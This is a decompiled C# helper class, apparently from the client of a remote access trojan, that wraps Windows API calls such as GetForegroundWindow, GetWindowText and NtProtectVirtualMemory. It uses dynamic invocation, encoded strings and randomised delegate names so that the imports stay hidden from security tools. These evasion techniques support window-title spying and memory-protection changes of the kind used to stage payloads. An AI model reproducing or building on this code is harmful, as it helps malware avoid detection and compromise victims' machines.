using System;
using System.Text;

namespace Client.Helper
{
	// Token: 0x02000009 RID: 9
	public static class DllImport
	{
		// Token: 0x0600002B RID: 43 RVA: 0x000038BC File Offset: 0x00001ABC
		public static int GetModuleHandleA(string lpModuleName)
		{
			object[] array = new object[]
			{
				lpModuleName
			};
			return ((IntPtr)DInvokeCore.DynamicAPIInvoke(EncryptString.Decode("kernel32.dll"), EncryptString.Decode("GetModuleHandleA"), typeof(Delegates.DSBnjin8bs92nbjfsdi), ref array)).ToInt32();
		}

		// Token: 0x0600002C RID: 44 RVA: 0x0000390C File Offset: 0x00001B0C
		public static DllImport.EXECUTION_STATE SetThreadExecutionState(DllImport.EXECUTION_STATE esFlags)
		{
			object[] array = new object[]
			{
				esFlags
			};
			return (DllImport.EXECUTION_STATE)DInvokeCore.DynamicAPIInvoke(EncryptString.Decode("kernel32.dll"), EncryptString.Decode("SetThreadExecutionState"), typeof(Delegates.dsGFGdg), ref array);
		}

		// Token: 0x0600002D RID: 45 RVA: 0x00003958 File Offset: 0x00001B58
		public static IntPtr GetForegroundWindow()
		{
			object[] array = new object[0];
			return (IntPtr)DInvokeCore.DynamicAPIInvoke(EncryptString.Decode("user32.dll"), EncryptString.Decode("GetForegroundWindow"), typeof(Delegates.dsUinnb8sdn9g8bngs), ref array);
		}

		// Token: 0x0600002E RID: 46 RVA: 0x0000399C File Offset: 0x00001B9C
		public static int GetWindowText(IntPtr hWnd, StringBuilder text, int count)
		{
			object[] array = new object[]
			{
				hWnd,
				text,
				count
			};
			return (int)DInvokeCore.DynamicAPIInvoke(EncryptString.Decode("user32.dll"), EncryptString.Decode("GetWindowTextA"), typeof(Delegates.buhsdINJOMF9nuijm), ref array);
		}

		// Token: 0x0600002F RID: 47 RVA: 0x000039F4 File Offset: 0x00001BF4
		public static bool GetDiskFreeSpaceEx(string lpDirectoryName, ref long lpFreeBytesAvailable, ref long lpTotalNumberOfBytes, ref long lpTotalNumberOfFreeBytes)
		{
			object[] array = new object[]
			{
				lpDirectoryName,
				lpFreeBytesAvailable,
				lpTotalNumberOfBytes,
				lpTotalNumberOfFreeBytes
			};
			bool result = (bool)DInvokeCore.DynamicAPIInvoke(EncryptString.Decode("kernel32.dll"), EncryptString.Decode("GetDiskFreeSpaceEx"), typeof(Delegates.gvSUDINJons29fg), ref array);
			lpFreeBytesAvailable = (long)array[1];
			lpTotalNumberOfBytes = (long)array[2];
			lpTotalNumberOfFreeBytes = (long)array[3];
			return result;
		}

		// Token: 0x06000030 RID: 48 RVA: 0x00003A78 File Offset: 0x00001C78
		public static bool NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, ref uint OldProtect)
		{
			OldProtect = 0U;
			object[] array = new object[]
			{
				ProcessHandle,
				BaseAddress,
				RegionSize,
				NewProtect,
				OldProtect
			};
			if ((uint)DInvokeCore.DynamicAPIInvoke(EncryptString.Decode("ntdll.dll"), EncryptString.Decode("NtProtectVirtualMemory"), typeof(Delegates.gdfudsin8shd2), ref array) != 0U)
			{
				return false;
			}
			OldProtect = (uint)array[4];
			return true;
		}

		// Token: 0x02000021 RID: 33
		public enum EXECUTION_STATE : uint
		{
			// Token: 0x04000045 RID: 69
			ES_CONTINUOUS = 2147483648U,
			// Token: 0x04000046 RID: 70
			ES_DISPLAY_REQUIRED = 2U,
			// Token: 0x04000047 RID: 71
			ES_SYSTEM_REQUIRED = 1U
		}
	}
}
